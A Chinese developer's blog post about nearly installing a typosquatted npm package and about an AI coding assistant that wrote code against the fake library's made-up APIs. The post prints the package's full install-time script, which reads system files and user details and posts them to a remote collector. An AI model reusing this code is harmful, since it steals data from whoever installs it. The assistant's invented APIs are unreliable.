---
title: '我是怎么差点被恶意 npm 包攻击的'
description: '其实我很久以前就听说过有骇客通过在 npm、PyPI 等平台注册名字和知名库碰瓷的恶意包。一直以来我以为这种事情离我很远，因为我在使用一个库以前总会去看官方文档，并且在进行依赖安装时复制文档里提到的包名。'
pubDate: '2025-04-24T06:56:32.000Z'
updatedDate: '2025-04-24T07:15:59.000Z'
---

其实我很久以前就听说过有骇客通过在 npm、PyPI 等平台注册名字和知名库碰瓷的恶意包，实现入侵公司内部系统等恶意操作的事情。一直以来我以为这种事情离我很远，因为我在使用一个库以前总会去看官方文档，并且在进行依赖安装时复制文档里提到的包名。

事实证明，我的实践确实是好的，至少在 LLM 大幅普及以前。直到不久前，我试图使用 Atlassian 家出品的 [@atlaskit/pragmatic-drag-and-drop](https://www.npmjs.com/package/@atlaskit/pragmatic-drag-and-drop) 库来在 React 应用里实现列表拖动排序功能。然后，我险些在这件事上翻车了。于是我便发了一篇推文：

<blockquote class="twitter-tweet"><p lang="zh" dir="ltr">傻了，自认为安全意识很好的我也差点被恶意 npm 包攻击了。还好 pnpm 10 默认没有运行这个恶意包的 build scripts，而且 rsbuild 也跑不动这个脚本，我才免遭一劫。<br>已经举报这个包了。 <a href="https://t.co/dyk15BbZMq">pic.twitter.com/dyk15BbZMq</a></p>&mdash; 陶瓷大碗 (@tcdwww) <a href="https://twitter.com/tcdwww/status/1914202659210359108?ref_src=twsrc%5Etfw">April 21, 2025</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

本来只是随手吐槽，没想到那条推文火了，热度远超我的预期；因为我一开始没有在推文里提及完整的过程，导致出现了很多猜测和质疑：

- 「这个包名是不是 LLM 幻觉了一个出来的？」
- 「这个包才发布没几天，还是个三无号发布的，能装上这种包的人也是个人才。」
- 「这个包会读取 `/etc/passwd`，是不是能偷我的密码？」
- ……

既然如此，因为单独回复每一条评论或群组里的每一条消息的话，别人不一定能看得见，我觉得有必要详细解释一下其中的几个细节，给大家一个完整的复盘。

### 为什么我会装上这个包？

首先，<b>那个包的包名其实不是 LLM 编的，是我自己想当然的名字。</b>因为这个项目的 GitHub 地址是 [https://github.com/atlassian/pragmatic-drag-and-drop](https://github.com/atlassian/pragmatic-drag-and-drop) ，而且这个项目的名字如此冗长，我便想当然的认为，这个包应该就叫 `pragmatic-drag-and-drop`。顺带一提，这个包其实我之前听说过，但是不太熟悉，也没有亲自用过。

我平时用的编辑器有 Webstorm 和 Windsurf。因为我恰好偷懒没有写项目级别的 `.windsurfrules` 文件，导致 AI 有时候会用 npm 装依赖（其实这个项目用 pnpm），加上 AI 思考要不要装包的这一步就要花费一些时间，所以想着干脆提前把包装好，叫 AI 直接用这个包写代码比较方便。

我一开始以为 Atlassian 这种大厂出品的库，包名应该不会有什么奇怪的「埋雷」操作。结果我就这么稀里糊涂装上了一个碰瓷的恶意包。

其实 pnpm 10 已经提醒我，这个包有没有被允许的 Lifecycle Scripts，但我的习惯是只在必要时才单独开启个别包的 Lifecycle Scripts 执行权限。毕竟除去 `esbuild` 之类要设置二进制的包，很多 npm 包的 postinstall 脚本只是打印点东西，不开也没啥影响。

### AI 也会踩雷

接下来我让 LLM 用这个包写一个可拖拽的列表。它完全没意识到包有问题，反而一本正经地写了一堆 API，还写了调用这个「库」的代码。

我看 tsc 没报错，就直接 `pnpm run dev`，结果 rsbuild 报错说有些 node 模块无法处理。

我一脸问号，去看报错部分，直接懵了：WTF？

![Rsbuild 构建不了恶意包](https://assets.tcdww.cn/website/blog/post/2025/rsbuild-error.png)

就这样，我差点就酿成惨剧。

### 事后复盘：还好有惊无险

那么，这个恶意包究竟有多恶意呢？下面是这个包中唯一的 js 文件内容：

```javascript
const os = require("os");
const dns = require("dns");
const fs = require("fs");
const https = require("https");
const packageJSON = require("./package.json");
const packageName = packageJSON.name;

// Collect system data from the remote server where the package is installed
const trackingData = JSON.stringify({
    p: packageName,  // Package name
    c: __dirname,    // Directory where the package is installed
    hd: os.homedir(),  // Home directory on the remote server
    hn: os.hostname(),  // Hostname of the remote server
    un: os.userInfo().username,  // Username on the remote server
    dns: dns.getServers(),  // DNS servers on the remote server
    v: packageJSON.version,  // Version of the package
    pjson: packageJSON,  // Full package.json data
    etc_passwd: fs.existsSync('/etc/passwd') ? fs.readFileSync('/etc/passwd', 'utf8') : null,  // /etc/passwd from the remote system
    etc_hosts: fs.existsSync('/etc/hosts') ? fs.readFileSync('/etc/hosts', 'utf8') : null  // /etc/hosts from the remote system
});

// Log the data to verify it's the remote server's information
console.log("Sending System Data from Remote Server: ", trackingData);

// Prepare the POST request data
var postData = JSON.stringify({
    msg: trackingData,
});

// Request options to send data to your server (Burp Collaborator or any endpoint)
var options = {
    hostname: "<REDACTED>",  // Burp Collaborator server
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/json",
        "Content-Length": postData.length,
    },
};

// Send the data via HTTPS POST request
var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);  // Output the response from the server
    });
});

req.on("error", (e) => {
    console.error("Error sending data:", e);  // Handle any error during the request
});

req.write(postData);  // Send the data in the request body
req.end();  // End the request
```

冷静下来复盘，发现即便这个脚本真的执行了，对我的影响其实有限：

- 我用的是 macOS，因为 macOS 的用户信息是用 [Open Directory](https://en.wikipedia.org/wiki/Apple_Open_Directory) 管理的，`/etc/passwd` 里的内容毫无价值。
  - 不过就算是 Linux 系统，用户的密码其实存储在 `/etc/shadow` 里，不仅只有 `root` 用户才能访问，而且还是经过 hash 的。
- `/etc/hosts` 我也没用，没有有价值的信息。
- 这个脚本还会上传我用的 DNS 服务器（然而是阿里云的公共 DNS）、包名、package.json 等等。
- 当然，它也能知道我的 IP 地址（我开了 Surge 增强模式，应该拿到的是我机场落地的 IP）。
- 顺带一提，这个包完全没考虑 Windows。

所以我感觉，这个恶意包其实更希望在 CI 服务器上发挥作用，可能能刺探一些公司内网的信息。以我浅薄的知识，也不太明白还有什么更深的危害。

顺带一提，这个脚本会把收集到的这些信息上传到一个域名后缀是 oastify.com 的地址。所以我估计是有真・白帽黑客在搞研究，也有可能是[恶意人士利用这个平台收集数据](https://www.ithome.com.tw/news/166874)。

### 我学到了什么

这次事件的本质问题有哪些呢？

首先，我一开始犯了蠢，包名没查清楚。然后 LLM 也没意识到问题，还一本正经「幻觉」出一堆 API；还好 pnpm 10 和 Rsbuild 最终把我拦住了。

结论就是，人和 AI 都不能掉以轻心。这次我学到的最大教训是：以后让 AI 用某个库帮我写代码前，一定要考虑三要素：

- 这个库是否真的能满足我的需求？
- 这个库还在积极维护吗，或者是否已处于稳定状态？
- 我到底该装哪个 npm 包？

希望我的这次经历能给大家提个醒：无论是人还是 AI，面对陌生依赖都要多留个心眼，别让小疏忽变成大事故。